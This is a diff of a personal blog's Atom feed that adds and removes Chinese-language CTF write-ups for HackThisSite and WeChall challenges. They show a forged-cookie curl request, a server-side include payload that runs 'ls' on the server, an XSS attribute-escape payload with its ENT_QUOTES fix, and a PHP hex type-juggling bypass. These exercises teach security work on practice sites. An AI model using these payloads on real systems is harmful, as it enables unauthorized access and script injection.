@@ -13,7 +13,57 @@
     <![CDATA[Tech, Security & Personal Notes]]>
   </subtitle>
   <title>Hello Navi</title>
-  <updated>2026-06-08T14:03:29.981Z</updated>
+  <updated>2026-06-08T14:40:46.428Z</updated>
+  <entry>
+    <author>
+      <name>vkkkv</name>
+    </author>
+    <category term="ctf" scheme="https://vkkkv.github.io/categories/ctf/"/>
+    <category term="ctf" scheme="https://vkkkv.github.io/tags/ctf/"/>
+    <category term="writeup" scheme="https://vkkkv.github.io/tags/writeup/"/>
+    <category term="web" scheme="https://vkkkv.github.io/tags/web/"/>
+    <category term="hackthissite" scheme="https://vkkkv.github.io/tags/hackthissite/"/>
+    <category term="cookie" scheme="https://vkkkv.github.io/tags/cookie/"/>
+    <content>
+      <![CDATA[<h3 id="challenge">Challenge</h3><blockquote><p>This time Sam used a more temporary and "hidden" approach toauthenticating users, but he didn't think about whether or not thoseusers knew their way around javascript...</p><p>Sam使用了一种更临时、更"隐蔽"的方式来认证用户，但他没考虑到用户是否懂JavaScript。</p></blockquote><p>页面有一个密码输入框。</p><h3 id="solution">Solution</h3><p>访问页面时，服务器会设置一个 cookie：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Set-Cookie: level10_authorized=no</span><br></pre></td></tr></table></figure><p>提交密码时，服务器检查这个 cookie 的值。如果<code>level10_authorized=no</code>，则拒绝访问。</p><p>解法：将 cookie 值改为 <code>yes</code>，然后提交表单。</p><p><strong>方式一</strong>：浏览器开发者工具 Console：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">document</span>.<span class="property">cookie</span> = <span class="string">&quot;level10_authorized=yes&quot;</span>;</span><br></pre></td></tr></table></figure><p><strong>方式二</strong>：curl：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ curl -sL \</span><br><span class="line">    -b <span class="string">&#x27;HackThisSite=YOUR_COOKIE; level10_authorized=yes&#x27;</span> \</span><br><span class="line">    -e <span class="string">&#x27;https://www.hackthissite.org/missions/basic/10/&#x27;</span> \</span><br><span class="line">    -d <span class="string">&#x27;password=&#x27;</span> \</span><br><span class="line">    <span class="string">&#x27;https://www.hackthissite.org/missions/basic/10/index.php&#x27;</span></span><br></pre></td></tr></table></figure><p>核心知识点：Cookie 是存储在客户端的，用户可以随意修改。不要依赖客户端cookie 来做安全认证决策。任何存储在客户端的状态都可以被篡改。</p>]]>
+    </content>
+    <id>https://vkkkv.github.io/wp/HackThisSite/hackthissite-basic-10/</id>
+    <link href="https://vkkkv.github.io/wp/HackThisSite/hackthissite-basic-10/"/>
+    <published>2026-06-08T14:40:44.000Z</published>
+    <summary>
+      <![CDATA[<h3 id="challenge">Challenge</h3>
+<blockquote>
+<p>This time Sam used a more temporary and "hidden" approach to
+authenticating users, but he]]>
+    </summary>
+    <title>HackThisSite - Basic Mission 10</title>
+    <updated>2026-06-08T14:40:46.428Z</updated>
+  </entry>
+  <entry>
+    <author>
+      <name>vkkkv</name>
+    </author>
+    <category term="ctf" scheme="https://vkkkv.github.io/categories/ctf/"/>
+    <category term="ctf" scheme="https://vkkkv.github.io/tags/ctf/"/>
+    <category term="writeup" scheme="https://vkkkv.github.io/tags/writeup/"/>
+    <category term="web" scheme="https://vkkkv.github.io/tags/web/"/>
+    <category term="hackthissite" scheme="https://vkkkv.github.io/tags/hackthissite/"/>
+    <category term="ssi" scheme="https://vkkkv.github.io/tags/ssi/"/>
+    <content>
+      <![CDATA[<h3 id="challenge">Challenge</h3><blockquote><p>Network Security Sam is going down with the ship - he's determined tokeep obscuring the password file, no matter how many times people manageto recover it. This time the file is saved in/var/www/hackthissite.org/html/missions/basic/9/.</p><p>In the last level, however, in my attempt to limit people to usingserver side includes to display the directory listing to level 8 only, Ihave mistakenly screwed up somewhere.. there is a way to get theobscured level 9 password.</p><p>Sam 坚持继续藏密码文件。这次藏在 /missions/basic/9/ 目录。但他承认上一关的限制搞砸了——仍然有办法获取 level 9 的密码。</p></blockquote><p>注意：这一关页面没有输入框（除了密码框），没有可直接注入的地方。</p><h3 id="solution">Solution</h3><p>题目暗示上一关的 SSI 漏洞仍然可以利用来访问 level 9 的密码。</p><p>回到 Basic 8 的 <code>level8.php</code>，再次使用 SSI注入，但这次将路径指向 level 9 的目录：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--#exec cmd=&quot;ls ../9/&quot; --&gt;</span></span><br></pre></td></tr></table></figure><p>提交后访问生成的 <code>.shtml</code> 文件，输出显示 level 9目录内容：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">index.php</span><br><span class="line">p91e283zc3.php    ← 密码文件</span><br></pre></td></tr></table></figure><p>访问<code>https://www.hackthissite.org/missions/basic/9/p91e283zc3.php</code>获取密码。</p><p>核心知识点： 1.修复一个漏洞时要确保修复彻底——不能只限制某个特定范围就以为安全了 2.路径遍历（directory traversal）可以突破相对路径限制</p><span class="spoiler" onclick="this.classList.toggle('spoiler')"><span class="spoiler-blur ">1883004c</span></span>]]>
+    </content>
+    <id>https://vkkkv.github.io/wp/HackThisSite/hackthissite-basic-09/</id>
+    <link href="https://vkkkv.github.io/wp/HackThisSite/hackthissite-basic-09/"/>
+    <published>2026-06-08T14:05:56.000Z</published>
+    <summary>
+      <![CDATA[<h3 id="challenge">Challenge</h3>
+<blockquote>
+<p>Network Security Sam is going down with the ship - he's determined to
+keep obscuring the]]>
+    </summary>
+    <title>HackThisSite - Basic Mission 9</title>
+    <updated>2026-06-08T14:05:58.129Z</updated>
+  </entry>
   <entry>
     <author>
       <name>vkkkv</name>
@@ -450,55 +500,5 @@ pair。密文保留原始空格分词，无换行。明文是标准英文，含�
     </summary>
     <title>WeChall - PHP 0815</title>
     <updated>2026-06-05T10:26:29.356Z</updated>
-  </entry>
-  <entry>
-    <author>
-      <name>vkkkv</name>
-    </author>
-    <category term="ctf" scheme="https://vkkkv.github.io/categories/ctf/"/>
-    <category term="ctf" scheme="https://vkkkv.github.io/tags/ctf/"/>
-    <category term="writeup" scheme="https://vkkkv.github.io/tags/writeup/"/>
-    <category term="xss" scheme="https://vkkkv.github.io/tags/xss/"/>
-    <category term="wechall" scheme="https://vkkkv.github.io/tags/wechall/"/>
-    <category term="php" scheme="https://vkkkv.github.io/tags/php/"/>
-    <category term="exploit" scheme="https://vkkkv.github.io/tags/exploit/"/>
-    <content>
-      <![CDATA[<h3 id="challenge">Challenge</h3><p>利用一行有 XSS 漏洞的 PHP 代码。目标是找到漏洞点并提交修复方案。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;a href=&#x27;http://&quot;</span>.<span class="title function_ invoke__">htmlspecialchars</span>(<span class="title class_">Common</span>::<span class="title function_ invoke__">getPost</span>(<span class="string">&#x27;input&#x27;</span>)).<span class="string">&quot;&#x27;&gt;Exploit Me&lt;/a&gt;&quot;</span>;</span><br></pre></td></tr></table></figure><h3 id="solution">Solution</h3><p><strong>漏洞分析</strong>: <code>htmlspecialchars()</code>的默认模式是 <code>ENT_COMPAT</code>，只转义双引号 <code>"</code>（转为<code>&amp;quot;</code>），不转义单引号 <code>'</code>。而 href属性值恰好用单引号包裹，因此可以通过单引号逃逸出属性值，注入 XSS事件。</p><p><strong>第一步 — 漏洞利用</strong>:</p><p>在 input 中输入一个单引号闭合 href，然后注入事件处理属性:</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; onmouseover=&#x27;alert(1)</span><br></pre></td></tr></table></figure><p>生成的 HTML:</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&#x27;http://&#x27;</span> <span class="attr">onmouseover</span>=<span class="string">&#x27;alert(1)&#x27;</span>&gt;</span>Exploit Me<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure><p>注意三个单引号的闭合逻辑： - <code>href='http://</code> 为 HTML模板的开头部分 - 第一个 <code>'</code> 闭合了 href 的起始单引号 -<code>onmouseover='alert(1)'</code> 被解析为新的 HTML 属性 - 最后的<code>'&gt;</code> 会落在属性值的单引号后面（不闭合也不影响渲染）</p><p>悬停在链接上就会触发 <code>onmouseover</code>。在 WeChall自己的测试页面里，鼠标悬停就能看到 alert 弹窗。</p><p><strong>第二步 — 修复</strong>:</p><p>给 <code>htmlspecialchars()</code> 加上 <code>ENT_QUOTES</code>标志，使单引号也被转义：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;a href=&#x27;http://&quot;</span>.<span class="title function_ invoke__">htmlspecialchars</span>(<span class="title class_">Common</span>::<span class="title function_ invoke__">getPost</span>(<span class="string">&#x27;input&#x27;</span>), ENT_QUOTES).<span class="string">&quot;&#x27;&gt;Exploit Me&lt;/a&gt;&quot;</span>;</span><br></pre></td></tr></table></figure><p>加上 <code>ENT_QUOTES</code> 后，输入 <code>'</code> 会被转为<code>&amp;#039;</code>，无法再逃逸 href 属性。</p><p><strong>提交方式</strong>: POST 到<code>htmlspecialchars.php</code>，字段名为 <code>solution</code>（不是<code>answer</code>），<code>cmd=Submit</code>。需要 CSRF token。</p><span class="spoiler" onclick="this.classList.toggle('spoiler')"><span class="spoiler-blur ">echo<a href='http://.htmlspecialchars(Common::getPost(input), ENT_QUOTES).'>ExploitMe</a>;</span></span>]]>
-    </content>
-    <id>https://vkkkv.github.io/wp/WeChall/wechall-htmlspecialchars/</id>
-    <link href="https://vkkkv.github.io/wp/WeChall/wechall-htmlspecialchars/"/>
-    <published>2026-06-05T10:22:39.000Z</published>
-    <summary>
-      <![CDATA[<h3 id="challenge">Challenge</h3>
-<p>利用一行有 XSS 漏洞的 PHP 代码。目标是找到漏洞点并提交修复方案。</p>
-<figure class="highlight php"><table><tr><td]]>
-    </summary>
-    <title>WeChall - htmlspecialchars</title>
-    <updated>2026-06-05T10:22:40.196Z</updated>
-  </entry>
-  <entry>
-    <author>
-      <name>vkkkv</name>
-    </author>
-    <category term="ctf" scheme="https://vkkkv.github.io/categories/ctf/"/>
-    <category term="ctf" scheme="https://vkkkv.github.io/tags/ctf/"/>
-    <category term="writeup" scheme="https://vkkkv.github.io/tags/writeup/"/>
-    <category term="wechall" scheme="https://vkkkv.github.io/tags/wechall/"/>
-    <category term="php" scheme="https://vkkkv.github.io/tags/php/"/>
-    <category term="exploit" scheme="https://vkkkv.github.io/tags/exploit/"/>
-    <content>
-      <![CDATA[<h3 id="challenge">Challenge</h3><p>PHP type juggling 挑战。源码要求输入一个 "magic number"，不能包含数字1-9，但必须等于 3735929054。</p><h3 id="solution">Solution</h3><p>源码关键逻辑:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">noother_says_correct</span>(<span class="params"><span class="variable">$number</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$one</span> = <span class="title function_ invoke__">ord</span>(<span class="string">&#x27;1&#x27;</span>);</span><br><span class="line">    <span class="variable">$nine</span> = <span class="title function_ invoke__">ord</span>(<span class="string">&#x27;9&#x27;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="title function_ invoke__">strlen</span>(<span class="variable">$number</span>); <span class="variable">$i</span>++) &#123;</span><br><span class="line">        <span class="variable">$digit</span> = <span class="title function_ invoke__">ord</span>(<span class="variable">$number</span>[<span class="variable">$i</span>]);</span><br><span class="line">        <span class="keyword">if</span> ((<span class="variable">$digit</span> &gt;= <span class="variable">$one</span>) &amp;&amp; (<span class="variable">$digit</span> &lt;= <span class="variable">$nine</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;  <span class="comment">// 禁止数字 1-9</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$number</span> == <span class="string">&quot;3735929054&quot;</span>;  <span class="comment">// loose comparison</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>数字 0 是允许的（只检查 1-9）。<code>3735929054</code> 的十六进制是<code>0xdeadc0de</code>，不包含 1-9。</p><p>PHP 的 loose comparison (<code>==</code>) 遇到 <code>0x</code>前缀的字符串时，PHP 7.x 及更早版本会将其按十六进制解析为整数。所以<code>"0xdeadc0de" == "3735929054"</code> →<code>3735929054 == 3735929054</code> → <code>true</code>。</p><p>这个技巧在 PHP 8.0+ 已被修复（hex string 不再被当作 numericstring），但 WeChall 仍运行在旧版 PHP 上。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ python3 -c <span class="string">&quot;print(0xdeadc0de)&quot;</span></span><br><span class="line"><span class="number">3735929054</span></span><br></pre></td></tr></table></figure><p>提交入口在 <code>php0818.php</code>，POST 字段为<code>number</code>（不是 <code>answer</code>，也不需要 CSRFtoken）。</p><span class="spoiler" onclick="this.classList.toggle('spoiler')"><span class="spoiler-blur ">0xdeadc0de</span></span>]]>
-    </content>
-    <id>https://vkkkv.github.io/wp/WeChall/wechall-php-0818/</id>
-    <link href="https://vkkkv.github.io/wp/WeChall/wechall-php-0818/"/>
-    <published>2026-06-05T10:19:02.000Z</published>
-    <summary>
-      <![CDATA[<h3 id="challenge">Challenge</h3>
-<p>PHP type juggling 挑战。源码要求输入一个 "magic number"，不能包含数字
-1-9，但必须等于 3735929054。</p>
-<h3]]>
-    </summary>
-    <title>WeChall - PHP 0818</title>
-    <updated>2026-06-05T10:19:03.949Z</updated>
   </entry>
 </feed>
